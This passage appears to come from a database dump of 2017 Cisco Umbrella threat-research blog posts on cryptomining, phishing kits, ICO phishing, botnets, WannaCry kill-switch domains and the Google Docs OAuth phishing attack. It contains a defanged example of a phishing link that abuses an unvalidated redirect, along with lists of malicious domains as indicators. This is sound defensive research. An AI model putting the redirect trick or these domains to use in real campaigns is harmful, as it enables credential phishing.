cryptomining should not be seen as malicious. There’s no exfiltration of data or credentials as there are in phishing attacks, the user’s hardware and software is not changed or damaged in many cases, and both Coinhive and Crypto-Loot miners only tie up the resources involved in mining for as long as the browser window or tab is open. Once closed, those resources are returned to the computer. Those resources however, specifically the bandwidth and power costs, are much more impactful when applied to a mobile device rather than a home computer. In the US, mobile plans often have data caps and users are encouraged to use WiFi when possible. If an app is cryptomining on a cellular plan, end users could be quickly eating into their data caps and incurring extra charges from their cellular provider. Similarly, home computers draw on AC power, but the point of a mobile device is to be able to go with you without the need for cords. If an app on a phone is running in the background, the battery life will be severely diminished.\nPanning for Crypto\nTo this end, Cisco Umbrella’s Security Research team classifies sites observed to be cryptominers as “potentially harmful”, an optional security setting for users of the Umbrella service. Because mining is not inherently malicious, we don’t believe that blocking the domains that host such services is the appropriate response. However, many domains which utilize cryptomining scripts do not disclose this to their users, and these miners benefit unknown entities. Domains which disclose their mining to their users through use of a CAPTCHA may have this security categorization changed.\nClaim Jumpers\nIt’s a different story with software based cryptominers like Adylkuzz and cryptojacking. Adylkuzz is effectively a trojan that uses ETERNALBLUE and DOUBLEPULSAR to install cryptocurrency mining software on the infected system. For our purposes, cryptojacking is defined as the compromise or hacking of a website for purposes of placing a javascript miner without the owner’s knowledge. Such connections and domains are considered malicious and appropriately blocked as malware.\nThe Next Gold Rush\nWith cryptocurrency in the news more and more often these days, scrutiny and speculation are beginning to rise. What will happen in the next few years that might impact these emerging technologies and techniques? Two recent events point to a great deal more intervention from government.\nIn Venezuela, the government recently announced that they would launch a cryptocurrency of its own called the “petro”. Like other cryptocurrencies, this one has been created to serve a need outside of what conventional currencies can serve. This need however is quite unique: to circumvent sanctions from nation-state partners such as the U.S.\nIn America conversely, a new bill has been introduced that has some bitcoin traders worried about its overly broad language: S. 1241 takes aim at combating counterfeiting and money laundering, but undefined phrases like “digital currency” and expansive terms such as “No person shall knowingly conceal, falsify, or misrepresent, or attempt to conceal, falsify, or misrepresent, from or to a financial institution, a material fact concerning the ownership or control of an account or assets held in an account with a financial institution“ are a cause of concern for some.\nIt’s impossible to say with accuracy where the future will take cryptocurrencies or cryptominers, but they’re almost certainly here to stay. As the internet continues to evolve in its third decade of existence, enterprising individuals will always be looking for the next motherlode, taking advantage of a landscape that others can’t see.', 'Community;Field Reports;People & Culture;Security;Security Research;Threat Discovery;Uncategorized', 'https://umbrella.cisco.com/blog/2017/12/19/mounting-mining-mayhem/');

We also came across a few server side artifacts that give deeper insight into the campaign.\n\nThe Boring Phish\nTo most security professionals, the landing page in the image to your right is the equivalent to a dark alley in a bad neighborhood. The lack of branding, obscurity of the request, and conspicuous disregard for subtlely makes this a classic phishing attempt.\nIn some ways, it is hard to believe anyone would fall for a page like this. However, campaigns using similar landing pages have been occurring for over a year, which implies there must be some return on the attacker’s investment that makes these campaigns worthwhile.\nURIs and Redirections\nThere is a very clear structure here: the URIs commonly contain an index.php with an email parameter. Upon submission, a POST request is made to post.php which in turn will redirect the user to a thankyou.php. Note though, that the redirect is not always present.\n\n\nThe complete path of these PHP files vary from infected site and there have been a few cases in which the index.php and post.php are on different systems.\n/user/index.php?email=email@email.com\n/smg/mailbox/domain/index.php?email=email@email.com\n/images/themes/mail/mail/index.php?email=email@email.com\n/sean/index.php?email=email@email.com\nServer Side Code\npost.php is responsible for receiving the email address and user-provided password from the HTML form with index.php and passing it to the attacker. A simple email is used here to deliver the harvested credentials to the attacker’s email box.\nLet’s check out the code:\n\nThere are a few interesting lines here, that we’ll dive into in the upcoming sections.\n\nGeoLocation\nThe first lines retrieve the visitor’s IP address then use an IP GeoLocation service to determine its city. This code clearly looks under development as the url variable is redefined, with the first definition setting the URL of country endpoint and its redefinition changing to the city endpoint. It’s also worthwhile to note that API key is bound by the provider to a specific email address and server IP, as shown in the screenshot from the service provider’s website to the right. This suggests the attacker is customizing these landing pages per campaign.\nSubject Line\nThis campaign may have targeted Chinese users given the subject of the email which is sent to the attacker. There is also what looks to be a version string containing a date. If it is a date, it is much further in the past than when the attack was active.\n\nRecipients\nThree email addresses are listed as recipients of harvested credentials. This could be for redundancy purposes or perhaps there are three individuals involved in the collection of these domains.\n\nMultiple Campaigns\nThese phishing landing pages often live on servers with an out of date CRM like WordPress or Joomla. Since so many people are scanning the internet for vulnerable sites like these, it’s not uncommon to see evidence of multiple campaigns. In this instance, we counted three different campaigns on just one server.\nA secondary site mimicked the original with one small change:\n\nIn this instance, the attacker is redirecting to another site, bhp[.]pt, instead of the post.php located on the server. These are so common that a quick search for “confirm your account to upgrade your mailbox” will return in a handful of instances.\nThe DHL Phish\n\nOn the same server, a slightly more sophisticated campaign was targeting DHL users. The entire page, images and all, were part of a single HTML file that redirected users to a secondary server.\n\nIn addition to this redirection, there is also evidence that suggests the two sites may be working together on other campaigns. The same directory structure, leading to the same phishing page were found:\noriginal_site/sys/upgrade page/Aldomain/mailbox/domain/index.php\nskbizcorp[.]com/4/upgrade page/Aldomain/mailbox/domain/index.php\nThe Collector\nAnother, much more professionally written form collector was also found but not directly exposed through any of the other pages, indicating that the corresponding form that POSTs to it was hosted on another system. You can see here that the attacker opted against an IP Geolocation service that required registration, and had generally neater coding style. The author credited in the collector is ‘Techroins’.\n\nWeb Shells and Utilities!\nAs common with vulnerable CRMs, you’ll find a few different web shells in various directories. Some are password protected while others wide open. One of the more basic but not so common ones allows for arbitrary file upload, which surely comes in handy when uploading phishing pages:\n\nA PHP Mailer also helps here, giving the attackers the ability to spam out more attacks.\n\nThis one writes its content to a text file before sending out, so it may also be possible to see the last phish the attacker sent:\n\n\nWe’ll continue to watch out for these bad guys so you don’t have to!

A newly observed trend of Internet Coin Offerings (ICOs) is changing the way VCs work with startups.  A recent Coindesk report states that the Bancor ICO set a record by raising $153 million in Ether from approximately 10,885 buyers. According to Coinschedule, 140 of the currently active ICOs have raised over two billion dollars while Reuters estimates the overall value of the coin market is over $90 billion. ICO is not yet the most popular choice among startups or investors, but interest is increasing despite the many challenges it faces.\nWhile the largest challenges for ICO might be regulatory or legal, the focus here will be on security issues. Some of these issues include bugs in smart contracts, attacks on the websites of companies offering an ICO, errors in the implementation of multi-sig wallets, and DDOS attacks on currency networks. These contribute to about 50% of all cybercrime revenue, with the remainder being phishing schemes. Chainalysis, a blockchain analysis company, estimates the value of stolen cryptocurrencies from phishing attacks to be at 115 million dollars from over 16,900 victims.\nTracking phishing campaigns\nWhile the main protection mechanism we rely on in identifying phishing domains is our machine learning-based model, NLPRank, which is actively enhanced to detect different crypto currency wallet phishing attempts, we continue to apply other hunting approaches that leverage additional visibility into DNS data. Pivoting around IPs, registrants, and name servers allow us to expose bullet-proof hosting infrastructures and to block emerging attacks as soon as they go live or before they are launched.\nAutomated phishing pivoting flow\nPart of a phishing attack infrastructure exposed via this process:\nExposed Phishing infrastructure\nBlockchain[.]info, MyEtherWallet[.]com, Bittrex[.]com and several ICOs are some of the targets in recent campaigns. Their infrastructures are tied to Russian, Ukraine, and Hong Kong IP address space. Most phishing attempts still come in form of mass sent spam emails with generic messages which example we can see in the picture below:\nTypical message in the BTC phishing email\nWhile majority of the phishing domains has low amount of hits, with average count between 15 and 100\nQuery volume to the phishing domains\nQuery volume to the phishing domains\nOther delivery methods, such as search result poisoning, have proven to be an effective means of phishing users.

Recently, we discovered a strain of a credential stealer which targets digital wallets stored on computers as well as online services.  This threat is delivered via malspam messages with an attached doc file that contains a Powershell script which downloads malware. Then it finds stored wallets and credentials and uploads them to the C2:\nFunction stealing Ethereum Wallets\nFull list of trojan functions\nWhat to expect\nWe first observed phishing campaigns targeting cryptocurrency users in June 2016 when nobody knew what ICO was and when Bitcoin’s price was about $700. Now with Bitcoin’s price skyrocketing to nearly $4,000 and over 140 ICOs coming, we are sure that phishing attempts will continue to haunt cryptocurrency ICOs and their users. Anyone who is already a cryptocurrency user or is thinking about becoming one should be very careful. Some tips to avoid becoming a victim:\n\nDon’t follow any links in messages from services, try to remember or bookmark the services that you regularly using and avoid advertised google results\nBe suspicious of messages in social media and Slack forums, especially if they contain any URLs\nTreat messages from bots very carefully, as they can be easily crafted by malicious actors\nUse your common sense and check anything suspicious in the open source projects like Ethereum Scam Database', 'DNS;Labs Research;Security Research;Threat Discovery;Umbrella', 'https://umbrella.cisco.com/blog/2017/09/27/protecting-icos-cryptocurrency-users/');

You can usually tell if a series will be good or bad just from the title, poster, actors, and genre, but for some, you need a closer look at other info like a description, preview, and rating.\n\nThis is similar to Cisco Umbrella’s inspection! For most sites, Umbrella uses DNS-based intelligence and inspection to determine if good or bad. Then for a subset — the unknown or risky HTTP/HTTPS websites — Umbrella uses deeper inspection to determine if allowed or blocked. And, we’ve recently added two new features — file inspection and custom URL blocking — to provide you with even stronger protection! Unfortunately, these features can’t prevent you from watching a bad series  –– don’t worry, GoT season 8 will be here before you know it.\n\nGrab your popcorn, here’s a breakdown of the features:\n\nFile inspection\nFile inspection is a feature that scans files attempted to be accessed from the web to see if they contain malicious code, and blocks them if they do. If we receive a request for a file that matches our 150+ supported file types – .PDF, .EXE and more – we check the hash against info provided by a partner anti-virus (AV) engine and Cisco Advanced Malware Protection (AMP) to determine to block or allow. Learn more here.\n\nCustom URL blocking\nYou probably have access to threat intel on malicious URLs from other products, industry groups, and more. With Umbrella’s custom URL blocking, taking action on this info is easier and automated. You can add a single URL or upload a list of URLs to a block list, and automatically prevent your users from accessing these sites whether on or off the network. Learn more here.\n\nUmbrella’s intelligent proxy\nMost phishing, malware, ransomware, and other threats are hosted on domains that are classified as malicious. Yet some domains host both malicious and safe content — we consider these risky domains. If Umbrella receives a request for a risky domain, it is routed to our intelligent proxy for deeper inspection. Additionally, if Umbrella receives a request for a URL that is on a customer’s block list, it is also routed to our proxy and blocked. Learn more here.\n\nSupport for HTTPS traffic\nWe can scan both HTTP (e.g. clear text) websites and HTTPS (e.g. encrypted) websites. This is important because HTTPS websites represent almost half the internet! The Cisco Root CA is required to make decryption possible. Learn more here.\n\nWe have more exciting enhancements planned for our intelligent proxy — stay tuned to understand how Umbrella continues to deliver better protection for you.

I shared some insight on botnets and the malicious infrastructure behind them, seen from analyzing DNS traffic through Cisco Umbrella’s resolvers.\n\nBotnets enable the spread of malware and fuel the infrastructure behind cyber crime. Once a cyber crimminal is in control of a network of infected systems, they have the means to start spreading large amounts of malware, gaining access to private systems, and gaining resources for use in DDOS attacks.\nAnalyzing botnet IOCs can reveal previously unseen malicious indicators by pivoting off of domain names, name servers, and IP addresses. We’re going to show a few examples in this blog post of threat hunting using this technique. We’ll also highlight the different stages of an infected system as it’s used as part of a botnet.\nLifecycle of a Bot\nThe Infection and Spreading stage is when a threat actor begins the means in which they will get their malware onto systems, into email boxes, or setup for hosting malvertising or malicious code on websites. Systems already remotely controlled as part of a botnet are often rented out for a nominal fee. This allows an attacker to rent the use of an infected system in order to use its shared connections within the botnet to drop and propagate a malware payload of their choice. Infected systems that are able to send email can be used to send spam to new systems with the attackers malicious payload as the attachment or include an obfuscated URL in the email text leading to a website hosted by the attacker which will drop the malware payload.\nDuring the Command and Control (C2) Contact or Rallying stage, a bot will attempt to make contact with the attackers C2 server to alert on a successful infection. Domain and IP fast flux is typically used at this time. The C2 server will frequently change it’s hosting IP address(es) and use a low TTL, in order to evade detection by continuously moving hosting addresses.The malware will also contact a large set of domains using a Domain Generation Algorithm. The majority of these domain names are not registered and are NXDOMAINs. The actual C2 server used to control the now infected system will be within this large amount of callout requests to the DGA domains making it hard to differentiate. Infected bots can act as proxies between the infected systems and the C2 server. Compromised servers can also add another layer of proxies that the C2 server can attempt to hide behind.\nNow that the C2 server and attacker are aware of the newly infected bot that has joined the botnet, it moves on to the next stage where the bot will Report & Await Commands. Network communications established with the C2 server can allow it to receive additional commands to carry out and to send stolen information or files to the C2 server. The bandwidth provided by the bot can be used to perform DDoS attacks on a given target. More spam can be sent from capable bots at this time and additional malware will be dropped onto systems which is most typically; Remote Access Trojans, Ransomware, Crypto-Miners and Banking Trojans.\nThe final phase and goal now is to Maintain & Evade Detection to remain part of the botnet. Malware will use techniques to gain persistence on the system. The rallying techniques of proxy layers, DGAs, and domain and IP fast flux will continue.\n\nWhy Should We Research the Infrastructure Behind Botnets?\nWe research the infrastructure that is behind these botnets in order to help stop many cyber crimes. Botnets are a particularly hard problem to solve since there are millions of infected systems all over the globe, and not one central node or host. Infected systems often go unnoticed and particpate within a botnet undetected by users or companies. These systems can be leaking private information for years and also providing bandwith that furthers cyber crimes. The cheap price (within $10) that a bot can be rented or a malware payload can be distributed, also accelerates the proliferation of botnets.\nSpam and Pharma Fraud\nWe’ve been monitoring spam sent in the form of Russian sponsored Canadian pharma fraud (My Canadian Pharmacy) in notable instances on the Necurs botnet. This has surfaced on most likely compromised hosts used in the spread of Hailstorm spam. Associated hosts have been identified by SpamHaus as connected to the criminal spam organization Yambo Financials.\n\nThese spam messages go beyond the pushing of fake pharmaceuticals. The spam messages have spread ransomware such as Locky through malicious attachments. Malware is used that turn systems into spambots, sending out even more unwanted email messages. Links included within the messages have also inluded URLs leading to fake Russian dating sites.\nIOCs\nHailstorm spam IPs. The spam campaigns have rotated over time.

The design remains to be simple, as this attack is aimed at the most vulnerable components of information systems – the users. Startups launching Initial Coin Offerings are experiencing an increasing number of phishing attacks. As a result of these attacks, we see multiple reports in which invested funds have been lost in recent days.\nUntil recently, most of these attacks were delivered through spam messages with a majority of the attacks halted at the user’s inbox. In some cases the messages will be ignored because the signs of phishing are very obvious. Other times, the messages are forwarded to I.T support with the question “Is it safe to enter a password on this page?”. Of course, some of these users will be successfully phished, but the number is quite small compared to the amount of spam sent. In a recent incident in which the Coindash website was hacked, the attack involved tricking users to send funds to an address that the company has identified as belonging to the hacker. There are also new attacks against crypto currency users through the Slack platform. We’ve seen recent spearphishing attacks contain no links or exploits in the message body. Instead there is only a title/subject and googling this title leads to an exploit site. All of these show how fast new phishing attacks are emerging among malicious actors.\nAt Cisco Umbrella, one way that we’ve been monitoring emerging attacks and new trends is by using NLP Rank. In this blog post, we’re sharing some of the latest detected threats.\nAn Old Dog Learns New Tricks\nPunycode encoding\nOne trend is the use of punycode characters to encode internationalized domain names to impersonate well known domain names. We’ve seen this technique in the past before it has gained the recent wide adoption by malicious actors. The use of an additional OCR based filter has helped us to recognize suspicious domains names once the suggested block appears as a result of NLP based analysis on the domain name and it’s content.\nFree domain names\nMost of these abused domains are from TLDs that offer the domains free of charge. In this scenario, it’s not the price, but instead it’s the opportunity to get the domain name without leaving any trace in the form of payment information that is important. All you need is an email address that can later be discarded, and that’s it. Similarly, bullet proof hosting or abused large providers have been used.\nIn the example below, trying to register spoofing domain for one of the Ethereum wallet providers, we can see domain name myetherwallet[.]cf is already taken.\n\n\nCompromised and Obfuscated Emails Used for Registering\nSince setting up multiple emails for domain registration can be difficult, we often see compromised email addresses are used for registering domains. Another trick is to have one email for registering multiple domains and replace or “guard” such email addresses with different whois data anonymity services. In these cases, the whois provider will return a message similar to: “Due to restrictions in the Privacy Statement, personal information about the user of the domain name can not be released.” Services that allow users to register absolutely anonymously, such as Protonmail, are being abused for this technique.\nSSL certificates and free hosting\nIn general, people still think that the combination of HTTPS+SSL means the domain is trustworthy. In reality, this only means that your connection is private and that the traffic is protected while in transit. Another false belief exists that it is impossible to get a web server with a valid ssl certificate from CA, and leave no traces. As it turns out, this is not true. In many cases, the attackers are taking advantage of free SSL provided by hosting providers. A brief analysis of the available functions of a free package from SSL service providers reveals a storehouse of opportunities which can be abused by phishing actors:\nCompletely anonymous registration. Any valid email address is more than enough. Theoretically, an identity can be found from the analysis of the IP address used for registration, but sophisticated attackers are more than capable to hide their true IP address.\nAbused free certificates from CAs. Some of them are not only free, but are also issued within a few minutes of registering, without any additional verification being performed.\nThe real IP address of the web server is hidden. All traffic goes through a CDN like infrastructure.\nSSL offloading. A malicious web server can be configured to work with http, but with a service like Cloudflare, all of the traffic will go through SSL. This is important because you can easily get free hosting with HTTP, whereas you would have to pay for hosting with the HTTPS and SSL-payments, and this can be traced.\nWith rare exceptions, CA services do not sign certificates for domains at .ga, .cf, .tk, etc. And once again Cloudflare-like services solve this problem for the attacker, with the ease of which the certificate is issued.\n\nAds Poisoning\nWhile AdWords phishing is not a new threat, it is one of the most used in the case of phishing cryptocurrency users, as well as other financial institutions. Google and Bing are aware of the malicious use of their advertising platforms, but recent campaigns have proven that these attacks are frequently able to surpass detection. We observed the below campaign over the past 6-9 months. There are targeted companies that rotate through the campaign duration but the rest of the scheme stayed the same. This type of campaign has been covered in detail in our previous publications. The latest iteration of this campaign targets users of MyEtherWallet.\nMalicious ad\nSpoofing malicious domain\nUnvalidated Redirects\nPhishing emails are getting better and using a lot more targeted social engineering tactics. We have analyzed links within phishing emails that would at first not seem to be malicious or be an attempt at phishing. However, the link leads to a compromised website, that makes us of an “Unvalidated Redirects” vulnerability. The exploitation of this vulnerability helps to defeat many, if not all of the anti-spam filters commonly used. In an email the link would appear similar to:\nhxxps://company.com/unvalidated_redirect.php?url=http://login.company.cf/\nThe user sees the link directing to the original trusted site (company.com) and does not realize the redirection that could take place\nAbuse of  URL shorteners\n\nIn recent mass spam campaigns, we have seen a surge in the the use of  shortened url links in the e-mail body to drive traffic to spoofed domains. Once again this technique helps to defeat a significant amount of standard defenses and creates problems for typical users. Many people believe the responsibility rests on the URL shortener’s shoulder’s to guarantee safety of a shortened link. While many URL shorteners are working to decrease malicious links in their system, to totally eliminate such abuse is a very challenging problem. These schemes typically aim not only to harvest account credentials, but also used to deliver malware.\nDefeat the Phish\nHow do we take down malicious domains? It is the goal of many security researchers in our industry, but a unified solution does not yet exist. Conviction and punishment of the suspected phishing actor seems to be a hard goal to achieve. With the given complexity of the malicious infrastructure behind these attacks, a researcher would need to work in close collaboration with the Registrar, Cloud Service Provider, and the Email Service Provider being abused to find the actor behind such attacks. However, this approach could still leave you with only an IP address as an indicator. How would it be possible to “identify” a criminal by only their assumed IP address? I would say impossible.\nVisualization of malicious spoofing domains\nConclusion\nGiven the research being done to identify the scale of the problem behind simple typosquatting domains, we can see there are many users exposed to this threat. The amount of phishing attacks is growing and the criminal’s methods are constantly evolving. Cisco Umbrella is able to detect and block such domains using our high frequency classifiers like NLPRank. Additionally, user’s and companies themselves are strongly encouraged to enable two-factor authentication when possible and implement layered security controls.\nIOCs\nThis blog is a result of collaboration between Artsiom Holub of Cisco Umbrella research team and Jeremiah O’Connor of Cisco country digitization team.', 'Blog;Security Research;Threat Discovery;Uncategorized', 'https://umbrella.cisco.com/blog/2017/08/10/changing-standard-phishing-attack-trendstips-tricks/');

First, a phishing campaign posing as a Google Docs sharing request gained access to Google accounts then spread across its victim’s contacts, and now, a ransomware campaign with a bite, named WannaCry, autonomously infected vulnerable systems leveraging an exploit leaked on the internet.\nIn the early minutes of the attack, we worked with our Talos counterparts to analyze the behavior of WannaCry and protect our customers. We were also particularly proud to see that our Investigate product helped MalwareTech reduce WannaCry’s impact. In this post, we hope to give you a retrospective analysis of what we’ve observed during the first critical hours of the event.\nTimeline\nWannaCry couldn’t have been so impactful without the dramatic sequence of events in the months leading up to the attack. We broke down those events and how we protected our customers in the below infographic:\n\nThe Spread\nUpwards of 250,000 infections have been reported in various news articles and social media posts. Our unique view of the Internet allows us to visualize how these infections spread over time. We can do this by looking at the queries made to ‘kill switch’ domains. We first discussed these domains on the Talos blog and will look at them more in upcoming sections. The below graphic shows the countries with machines making queries to these domains (considered infected, or related to an infection) using our resolvers over time and the percentage of queries each country was responsible for in each period:\n\nUpdate: We noticed a small issue in the timestamp in the lower left of this video, it has been corrected.\nExposure\nNote: We’re monitoring port changes in machines with TCP 445 open and are seeing fluctuations in results that may impact the graph below – we’ll keep you updated as we find out more.\nWe’ve also looked at the number of hosts that had TCP 445 open to the internet at the time of this writing. This port is important because the SMB service that listens on it is what the initial exploit targets (MS17-010,CVE-2017-0143). As you might expect, a very large percentage of these machines had TCP445 open and may still be vulnerable:\n\n\nThe above graphics focus on the first two kill switch domains. A third also began to appear during the time of this writing:\niuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com\nifferfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com\nayylmaotjhsstasdfasdfasdfasdfasdfasdfasdf[.]com\nQueries to these domains implies that a system was compromised by the malware, but was not further infected, since we’re redirecting those requests to our block page. The query volume of these domains illustrates a very dramatic story:\n\nThe query volume to these known kill switch domains continues to spike, however, lost in those spikes are the actual number of machines querying the kill switch. A single machine may query these domains multiple times. To help shed deeper light into this, let’s look at the number of machines (per hour) querying the kill switch domains over the last 168 hours.\nUnique Machines\n\nNotice, the three kill-switch domains appear to start and exhibit a sort of power law in their magnitudes. That is, the iuq… domain is largest, the iff… domain smaller, and ayy… smallest of all. This is not a coincidence for multiple reasons. For starters, we known iuq… was the first kill-switch domain used in WannaCry, iff… second, and ayy… the latest.\nBut another interesting observation is what appears to be the magnitudes. The breadth of reach of each kill switch, in terms of the number of machines querying the domains, appears to be dropping off, the more kill switch domains exist. In a way, what we might be observing here is a sort of law to Ransomware more generally. That is, given a successful campaign, each successive iteration, will only have a fraction of the success rate of the previous.\nRepeating\nAnother helpful perspective on these queries is the number of machines repeating from hour to hour. Here’s that information for the last 168 hours.\n\nThe big spike on the ayy.. domain jumps out. This means that 100% of the machines from the previous hour made queries in the current hour. This spike occurs at a very early stage in this particular domain’s life, when the queries to this domain was limited to only a very small number of machines. It might mean reinfection, further spread of the malware, or just a researcher investigating the domain.\nRiskiness\nFinally, the last data point to take into account when looking at query volume is the median number of other domains queries by machines querying the kill switch domains. The intuition here is that the more active a specific machine is, the more likely they’ll come across something malicious.\nIts interesting to note that just as with the previous graph,  the ayy.. domain is an outlier here as well. Machines querying the ayy.. domain seem to query many more other domains.\nResearchers!\nWannaCry uses the InternetOpenUrl function when requesting the kill switch domain. This leaves off the User-Agent HTTP request header resulting in an HTTP request that looks like the following:\n\nWe looked at the percentages of blocks that had User Agent strings compared to those without. The thought here is that those with User Agent strings are people browsing to the domain and those without are from the malware itself. Plotting these two groups over time you can see an interesting dip where infections slowed down then picked back up:\n\nThe Kill Switch\nProbably one of the most interesting parts of WannaCry is the kill switch. While this may not be the first time such a mechanism was found in a piece of malware (e.g. Necurs), its intent is undeniably curious. It might have been for the attacker to control the worm, for the attacker to uncover when it was discovered by checking when it got sinkholed, or simply a sandbox evasion gone wrong. Whatever the reason, it played a huge part in halting the infection.\nTesting for Exposure\nOur Newly Seen Domains was a big help in protecting many of our customers, however many were concerned that blocking the domain would actually cause an infection. We created a simple test to mimic the logic of WannaCry, hopefully you’ll find it useful as well:\nIf you’re not accustomed to Visual Studio, you can use the binary attached to the gist, it was tested on 32bit Windows 8.1 with VS2015.\nDomain Composition\nAs we mentioned in the Talos blog post, the construction of the domain jumped out at us. It literally looked like someone smashed a few keys on the upper rows of the keyboard to arrive at it. Just for fun we plotted character distance and frequency:\n\nIt’s hard to say for sure how the domain was created, but it surely feels as if someone with two hands on the keyboard at home row position just alternated back and forth with little movement. Its even as if partway through they reminded themselves to be more random and reach all the way up to that top row with their middle finger for the nine!\nVariants\nThere will alway be copycats and WannaCry was no different. These little Frank Abagnales patch the binary to include different kill switch domains, bitcoin payment addresses, then let the worm spread. We continue to see these pop up:\n\nThese domains are so similar that we decided to illustrate how little work copycats are putting into creating new variants by calculating the Levenshtein distance between them. These low distances help quantify exactly how lazy they are:\nHere is a list of domains we found with simple pattern matching, you might also notice that most are the same length.\niuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]de\niuqerfsod9ifjaposdfjhgosurijfaewergwea[.]com\niuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]info\niuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]net\ndp9ifjaposdfjhgosurijfaewrwergwea[.]com\niuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]world\niuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]us\niuqssfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com\niuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]co\nifferfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com\niuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]org\niaaerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com\niuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com\niuqerfsodp9ifjaposdfjhgosurijfaewrwergweb[.]com\niuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]xyz\niuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]kr\niuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]cn\nayylmaotjhsstasdfasdfasdfasdfasdfasdfasdf[.]com\n\nInfected Websites\nCommon with most ransomware infections, the malware displays a ransom note when its encrypted files on the systems. WannaCry did this using its own executable, named @WanaDecryptor@.exe. We decided to look for websites hosting these executables and uncovered a slew. We’re not entirely sure if the website was actually compromised or there was something else going on, but we wanted to dig in a little to see what we could uncover. Below is the queries to 10 domains known to have the file, we anonymized them in the chance they are actually infected:\n\nNotice, all these domains appear to have increased volumes of activity in the last 3(or so) days. In fact, the amount of activity within the most recent period (the last day or so) appears to show the most dense period, so far. There are two take-aways from this: either 1) the WannaCry campaign is still in full throttle, or 2) the WannaCry campaign is dwindling as security researcher gain an edge into cracking the malware.\nRegardless of which interpretation of the events transpiring, these 10 domains offer insight into how the kill switch and domains hosting @WanaDecryptor@.exe compare. The largest take away is that the proportion of queries occurring to these domains hosting @WanaDecryptor@.exe is significantly smaller than to the smallest kill-switch domain query count. And yet, while smaller, these @WanaDecryptor@.exe domains exhibit more uniform amounts of queries: i.e. there isn’t one or two domains that seem to receive all the queries. This more uniform distribution of domains containing @WanaDecryptor@.exe information leads one to conjecture something about the infrastructure used to store the payloads required to download the ransomware.\nIn Conclusion\nWe’ll continue to monitor this event and others so that we can protect our customers!

We’re proud to say that our Sender Rank algorithm detected the attack before the blogs began to roll! Not only that, our unique perspective gives us insight into how successful the attack was. While most reports are looking at the email content itself, our focus is on network traffic, so let’s look there to see the staggering impact of the attack and what Sender Rank looked at to catch it.\n\nTimeframe and Domains\nOur data shows the attack was mainly concentrated between 2017-05-03 18:00:00 and 2017-05-03 19:00:00, consisting of the following domains that share the lexical attributes doc and cloud among them:\ngdocs[.]pro\ngdocs[.]win\ng-docs[.]pro\ng-docs[.]win\ndocscloud[.]win\ndocscloud[.]info\ngdocs[.]download\ng-cloud[.]pro\ng-cloud[.]win\ndocscloud[.]download\nThese domains had another common characteristic: a sharp increase in traffic volume. Further, the volume of traffic for these domains happened as most spam does: i.e. early in the morning and typically blasted. Below is an example (g-docs[.]win) of how the domain is dormant, with little or no query volume, prior to its release:\nDomain volume to g-cloud[.]win domain.\nThe Click\n\nThe phishing email contains an ‘Open in Docs’ button, which when clicked, sends the user to Google’s OAuth page for authentication and to grant permissions to the victim’s account. In the email we looked at, the URL assigned to the button click contained a redirect parameter, which, once allowed or denied at Google’s OAuth page, would redirect the user to an attacker-controlled website. As identified by our Sender Rank algorithm and confirmed in other articles, the domains listed above were found to be used in this attack, and likely the value of this redirect parameter.\nImpact\nThe button and the redirect sequence is particularly noteworthy since, in our testing, the user needs to click the ‘Open in Docs’ button, then either click ‘Allow’ or ‘Deny’ on Google’s OAuth page to contact one of these domains. There also were reports of other variants of the phish that just had a link to the attacker-controlled system. Regardless of how many steps it takes for the user to arrive at the attacker-controlled site, the fact that they always need to click something first makes the query volume particularly staggering. For instance, if we just look at four of the ten domains, we see an approximate average of 15,000 queries:\nQuery Volumes\n\n10 domains averaging 15,000 queries might suggest an upwards of 150,000 of our users actually clicked ‘Open in Docs’. Now, it’s hard to say how many users were affected using DNS data alone. Each DNS query does not equate to a single person, compromise, or even system. Nor does a DNS query mean that the system which queried the domain did so as a result of this attack. That being said, even if the actual number was 1/10th of the query count (which, as we’ll show shortly, is more likely the case), it is still staggering to think that many people let their guard down and clicked away.\nSender Rank\nLike all our models, Sender Rank provides visibility into what makes these attacker domains unique. For example, the queries to the attacker-controlled domains were at the same rate as some of the most popular and trusted sites on the internet: apple.com, travelocity.com, and salesforce.com! The following section will break down some of the behavioral attributes that Sender Rank used to detect these attacker domains.\nMachine Behavior\nA unique perspective we have in attacks like this is the ability to identify the behavior patterns within the queries made to the domains in the campaign. One interesting question you might ask is, what other malicious domains were being queried during the same time frame as these? In the following charts, we highlight a few aggregated metrics that give insight into the domains used in this attack.\nFirst, we can see that there were approximately 1,200 machines querying the three domains at the peak of the attack . This gives us a little more clarity to the impact. The interesting thing here is that machine count was sustained for roughly two hours, then saw a rapid decline in the 3rd hour (a 95% decrease on average).\nThe number of machines querying these domains\nAs we alluded to previously, we can also characterize simultaneous queries over the attack time frame. In other words, we can identify if these attacker domains caused additional queries outside of the norm. In the below chart we report the median number of unique queries made in the same hour (we use the median, rather than mean, due to outliers).\nThe median number of unique queries occurring in the same hour as those made to the attacker controlled domains.\nWe observe about 100 (or so) unique queries were simultaneously made during the time of the attack. This is an interesting comparison to the first chart since here we don’t see a decline in the 3rd hour of the attack.\nThe Email Server Ripple\nEmail servers will often use internet-based block list services when evaluating messages for spam and malicious content. Similar to Sender Rank, email block lists have the ability to aggregate and collate the reactions of a horde of mail servers, giving them a perspective that allows them to recognize large broad campaigns.\nIn the following table, we show the percentage change in the block list volume for the attacker controlled domains .\nDomain\n2017-05-03 18:00:00\n2017-05-03 19:00:00\n\n\ndocscloud[.]win\n509%\n4.7%\n\n\ng-cloud[.]win\n537%\n1.8%\n\n\ng-docs[.]win\n509%\n-31.4%\nTABLE 1: Percent change from one hour to the next.\nTo provide additional context, here are a few other domains Sender Rank is tracking (not blocking) with same 